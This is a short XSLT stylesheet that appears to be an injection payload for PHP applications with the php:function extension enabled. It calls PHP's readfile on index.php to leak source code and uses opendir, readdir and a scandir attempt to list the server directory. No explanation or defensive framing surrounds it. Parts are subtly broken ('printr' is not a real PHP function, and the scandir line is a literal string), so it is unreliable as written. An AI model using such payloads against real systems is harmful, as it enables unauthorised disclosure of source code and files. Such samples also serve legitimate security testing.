<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">

 <xsl:value-of select="php:function('readfile','index.php')" />
    
 <xsl:value-of select="php:function('opendir','.')"/>
<xsl:value-of select="php:function('readdir')"/>
 
<xsl:variable name="scana">
        implode('<br/>',scandir('.'))
</xsl:variable>
<br />Scan dir 1: <xsl:value-of select="php:function('printr',  $scana )" />
 
</xsl:template>
</xsl:stylesheet>
